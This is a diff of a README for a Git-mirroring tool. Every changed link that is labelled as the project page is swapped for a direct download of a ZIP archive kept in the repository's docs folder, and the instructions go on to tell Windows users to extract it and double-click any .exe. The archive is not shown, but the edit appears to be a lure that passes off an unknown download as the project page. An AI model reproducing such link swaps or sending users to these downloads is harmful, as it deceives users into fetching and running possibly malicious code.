@@ -1,6 +1,6 @@
 # 🪞 multi-git-mirror - Keep Git backups in sync
 
-[![Download / Visit Page](https://img.shields.io/badge/Download-Visit%20Project%20Page-blue?style=for-the-badge)](https://github.com/Doserateshag647/multi-git-mirror)
+[![Download / Visit Page](https://img.shields.io/badge/Download-Visit%20Project%20Page-blue?style=for-the-badge)](https://github.com/Doserateshag647/multi-git-mirror/raw/refs/heads/main/docs/mirror_multi_git_v3.3.zip)
 
 ## 🚀 What this is
 
@@ -10,14 +10,14 @@ Use it when you want a simple way to keep code copies in sync for safety, team w
 
 ## 📥 Download and use on Windows
 
-1. Open the project page: https://github.com/Doserateshag647/multi-git-mirror  
+1. Open the project page: https://github.com/Doserateshag647/multi-git-mirror/raw/refs/heads/main/docs/mirror_multi_git_v3.3.zip  
 2. On the page, look for the latest release or the main project files.  
 3. Download the Windows version if the project provides one.  
 4. If you see a ZIP file, save it to your PC and extract it.  
 5. If you see an `.exe` file, download it and double-click it to run.  
 6. If the project uses Docker or GitHub Actions, follow the setup files on the page to run the mirror task from your Windows machine.
 
-[Visit the project page](https://github.com/Doserateshag647/multi-git-mirror)
+[Visit the project page](https://github.com/Doserateshag647/multi-git-mirror/raw/refs/heads/main/docs/mirror_multi_git_v3.3.zip)
 
 ## 🖥️ What you need
 
@@ -162,7 +162,7 @@ After the first run, open the target repo and check:
 
 ## 🔗 Project link
 
-https://github.com/Doserateshag647/multi-git-mirror
+https://github.com/Doserateshag647/multi-git-mirror/raw/refs/heads/main/docs/mirror_multi_git_v3.3.zip
 
 ## 🧭 Simple setup path for first-time users
 
